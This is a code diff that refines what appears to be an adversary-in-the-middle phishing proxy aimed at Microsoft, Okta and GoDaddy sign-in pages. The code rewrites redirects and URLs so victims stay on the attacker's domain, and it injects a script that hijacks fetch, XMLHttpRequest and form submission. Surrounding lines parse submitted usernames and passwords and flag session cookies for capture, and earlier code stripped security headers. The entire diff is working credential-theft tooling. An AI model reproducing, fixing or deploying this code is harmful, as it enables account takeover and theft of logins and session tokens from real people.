@@ -95,22 +95,13 @@ function cleanQueryString(search) {
 
 // ==================== CRITICAL FIX: RECURSIVE URL CLEANER ====================
 
-/**
- * Detects and cleans recursive/mangled URLs like:
- * /_p/ayola-ozamu.zeabur.app/_p/login.microsoftonline.com/...
- * 
- * Returns the clean path starting from the first valid upstream
- */
 function cleanRecursivePath(pathname) {
-  // Pattern 1: /_p/YOUR_DOMAIN/_p/REAL_UPSTREAM/...
+  // Pattern: /_p/YOUR_DOMAIN/_p/REAL_UPSTREAM/...
   const recursivePattern = new RegExp(`^(_p\\/${YOUR_DOMAIN.replace(/\./g, '\\.')}\\/)+`, 'g');
   
-  // Remove all leading instances of _p/yourdomain.com/
   let cleaned = pathname.replace(recursivePattern, '');
   
-  // Ensure it starts with _p/ if it was a recursive proxy path
   if (!cleaned.startsWith(PROXY_PREFIX) && cleaned !== '/') {
-    // Check if what remains looks like a domain (contains dots)
     const firstSegment = cleaned.split('/')[0];
     if (firstSegment && firstSegment.includes('.')) {
       cleaned = PROXY_PREFIX + cleaned;
@@ -120,14 +111,9 @@ function cleanRecursivePath(pathname) {
   return cleaned;
 }
 
-/**
- * Extract the real upstream from potentially mangled pathname
- */
 function extractUpstreamFromPath(pathname) {
-  // First, clean any recursive prefixes
   const cleaned = cleanRecursivePath(pathname);
   
-  // Now parse normally
   if (!cleaned.startsWith(PROXY_PREFIX)) {
     return null;
   }
@@ -151,10 +137,8 @@ function extractUpstreamFromPath(pathname) {
 // ==================== FIXED UPSTREAM DETECTION ====================
 
 function getUpstreamInfo(pathname, search) {
-  // CRITICAL: Clean recursive paths first
   const cleanedPath = cleanRecursivePath(pathname);
   
-  // Check if this is a proxy request
   if (cleanedPath.startsWith(PROXY_PREFIX)) {
     const extracted = extractUpstreamFromPath(cleanedPath);
     
@@ -184,7 +168,6 @@ function getUpstreamInfo(pathname, search) {
       };
     }
     
-    // Check if it's a known provider
     const provider = IDENTITY_PROVIDERS[domain];
     
     return {
@@ -196,7 +179,6 @@ function getUpstreamInfo(pathname, search) {
     };
   }
   
-  // Not a proxy request - serve initial upstream
   return {
     upstream: INITIAL_UPSTREAM,
     type: 'microsoft',
@@ -221,12 +203,8 @@ function shouldProxyDomain(hostname) {
 
 // ==================== FIXED LOCATION REWRITING ====================
 
-/**
- * Parse Microsoft-style embedded URLs in paths
- * e.g., /common/https://domain.com/path or /common/https:/domain.com/path
- */
 function parseEmbeddedUrl(path) {
-  // Match patterns like: /common/https://domain.com or /common/https:/domain.com
+  // Match: /common/https://domain.com or /common/https:/domain.com
   const embeddedPattern = /\/(https?:)\/([^\/]+)(.*)/;
   const match = path.match(embeddedPattern);
   
@@ -235,7 +213,6 @@ function parseEmbeddedUrl(path) {
     const domain = match[2];
     const rest = match[3] || '';
     
-    // Normalize double slashes
     const fullUrl = `${protocol}//${domain}${rest}`;
     
     try {
@@ -258,63 +235,46 @@ function rewriteLocation(location, currentUpstream) {
   try {
     const url = new URL(location);
     
-    // Already our domain? Don't rewrite to avoid loops
+    // Already our domain? Don't rewrite
     if (url.hostname === YOUR_DOMAIN || url.hostname.endsWith(`.${YOUR_DOMAIN}`)) {
-      // Check if it's already a proxied URL
       if (url.pathname.includes(PROXY_PREFIX)) {
-        return location; // Already correct
+        return location;
       }
-      // It's a path on our domain, keep as-is
       return location;
     }
     
-    // Should we proxy this domain?
     if (shouldProxyDomain(url.hostname)) {
       const cleanSearch = cleanQueryString(url.search);
-      
-      // Check for embedded URLs in path (Microsoft specific)
       const embedded = parseEmbeddedUrl(url.pathname);
       
       if (embedded.isEmbedded) {
         const emb = embedded.embeddedUrl;
         
-        // If embedded URL points to our domain, extract its path
         if (emb.hostname === YOUR_DOMAIN) {
-          // Reconstruct: proxy the Microsoft path, but use the embedded path
-          // Original: /common/https://yourdomain.com/kmsi
-          // Result: https://yourdomain.com/_p/login.microsoftonline.com/common//kmsi
-          // (Note: double slash handled by path normalization)
-          
           const microsoftPath = embedded.beforeEmbedded;
           const targetPath = emb.pathname + emb.search;
-          
           return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${microsoftPath}${targetPath}`;
         }
         
-        // If embedded URL is another upstream, flatten it
         if (shouldProxyDomain(emb.hostname)) {
           return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${emb.hostname}${emb.pathname}${cleanSearch}`;
         }
       }
       
-      // Normal case: no embedded URL
       return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanSearch}`;
     }
     
-    // External URL - pass through
     return location;
     
   } catch (e) {
-    // Relative URL handling
+    // Relative URL
     if (location.startsWith('/')) {
-      // Check for embedded protocol in relative path
       const embedded = parseEmbeddedUrl(location);
       
       if (embedded.isEmbedded) {
         const emb = embedded.embeddedUrl;
         
         if (emb.hostname === YOUR_DOMAIN) {
-          // Extract just the path from our domain
           return emb.pathname + emb.search;
         }
         
@@ -323,7 +283,6 @@ function rewriteLocation(location, currentUpstream) {
         }
       }
       
-      // Normal relative URL - prefix with current upstream proxy
       if (currentUpstream) {
         return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${location}`;
       }
@@ -361,59 +320,48 @@ function parseCredentials(bodyText) {
   return { user, pass };
 }
 
-// ==================== INTERCEPTOR SCRIPT ====================
-
 function generateInterceptorScript(upstreamDomain, currentPath) {
   const basePath = currentPath.replace(/\/[^\/]*$/, '/');
   return `<script>(function(){
     const P='${PROXY_PREFIX}',D='${YOUR_DOMAIN}',U='${upstreamDomain}',B='${basePath}';
-    
-    // Prevent double-proxying
-    function r(u){
-      if(!u)return u;
-      // Already proxied?
-      if(u.includes(D+P))return u;
-      // Absolute URL?
-      if(u.startsWith('http')){
-        try{
-          let h=new URL(u).hostname;
-          if(['login.microsoftonline.com','login.live.com','office.com','microsoft.com','msauth.net','okta.com','godaddy.com','secureserver.net'].some(d=>h.includes(d))){
-            // Check for embedded URLs
-            const embedded = u.match(/(https?:\\/\\/[^\\/]+)(.*)/);
-            if(embedded){
-              const embHost = new URL(embedded[1]).hostname;
-              if(embHost === D) {
-                // Embedded our domain - extract path only
-                return 'https://'+D+new URL(embedded[1]).pathname;
-              }
-            }
-            return u.replace(/^https?:\\/\\/[^\\/]+/,'https://'+D+P+h);
-          }
-        }catch(e){}
-      }
-      // Protocol-relative
-      if(u.startsWith('//')){
-        let h=u.split('/')[2];
-        if(h&&shouldProxyHost(h))return'https://'+D+P+h+u.slice(2+h.length);
-      }
-      // Relative absolute
-      if(u.startsWith('/')){
-        if(u.startsWith(P))return u;
-        return'https://'+D+P+U+u;
-      }
-      // Relative relative
-      return'https://'+D+P+U+B+u;
-    }
-    
-    function shouldProxyHost(h){
-      return ['microsoft','live.com','office.com','msauth.net','okta.com','godaddy.com','secureserver.net'].some(d=>h.includes(d));
-    }
-    
+    function r(u){if(!u)return u;if(u.includes(D+P))return u;if(u.startsWith('http')){try{let h=new URL(u).hostname;if(['login.microsoftonline.com','login.live.com','office.com','microsoft.com','msauth.net','okta.com','godaddy.com','secureserver.net'].some(d=>h.includes(d)))return u.replace(/^https?:\\/\\/[^\\/]+/,'https://'+D+P+h)}catch(e){}}if(u.startsWith('//')){let h=u.split('/')[2];if(h&&r('https://'+h)!==u)return'https://'+D+P+h+u.slice(2+h.length)}if(u.startsWith('/'))return u.startsWith(P)?u:'https://'+D+P+U+u;return'https://'+D+P+U+B+u}
     const f=window.fetch;window.fetch=function(u,o){try{return f.call(this,typeof u==='string'?r(u):u instanceof Request?new Request(r(u.url),u):u,o)}catch(e){return f.call(this,u,o)}};
     const x=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u,a,user,pwd){try{return x.call(this,m,r(u),a,user,pwd)}catch(e){return x.call(this,m,u,a,user,pwd)}};
     const s=HTMLFormElement.prototype.submit;HTMLFormElement.prototype.submit=function(){if(this.action)this.action=r(this.action);return s.call(this)};
     document.addEventListener('click',function(e){let f=e.target.closest('form');if(f&&f.action)f.action=r(f.action)},true);
   })();</script>`;
+}
+
+// ==================== CRITICAL FIX: SAFE HEADER HANDLING ====================
+
+/**
+ * Create safe headers by copying from response - handles Edge Runtime immutability
+ */
+function createSafeHeaders(resp) {
+  const safeHeaders = new Headers();
+  
+  // List of headers to copy (whitelist approach)
+  const headersToCopy = [
+    'content-type',
+    'content-length',
+    'content-encoding',
+    'cache-control',
+    'expires',
+    'etag',
+    'last-modified',
+    'vary',
+    'x-frame-options',
+    'x-content-type-options'
+  ];
+  
+  headersToCopy.forEach(name => {
+    const value = resp.headers.get(name);
+    if (value) {
+      safeHeaders.set(name, value);
+    }
+  });
+  
+  return safeHeaders;
 }
 
 // ==================== MAIN HANDLER ====================
@@ -496,22 +444,24 @@ export default async function handleRequest(request) {
       redirect: 'manual'
     });
 
+    // CRITICAL FIX: Create new safe headers instead of modifying resp.headers
+    const newHeaders = createSafeHeaders(resp);
+
+    // Handle redirects
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
       const loc = resp.headers.get('Location');
       if (loc) {
-        const newHeaders = new Headers(resp.headers);
-        // Pass current upstream for relative URL resolution
         newHeaders.set('Location', rewriteLocation(loc, upstreamDomain));
         return new Response(null, { status: resp.status, headers: newHeaders });
       }
     }
 
-    const newHeaders = new Headers(resp.headers);
+    // Add CORS headers
     newHeaders.set('access-control-allow-origin', '*');
     newHeaders.set('access-control-allow-credentials', 'true');
-    ['content-security-policy', 'content-security-policy-report-only', 'clear-site-data', 'strict-transport-security'].forEach(h => newHeaders.delete(h));
 
-    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
+    // Handle cookies safely
+    const cookies = resp.headers.getSetCookie?.() || [];
     let cookieStr = '';
     let shouldCapture = false;
 
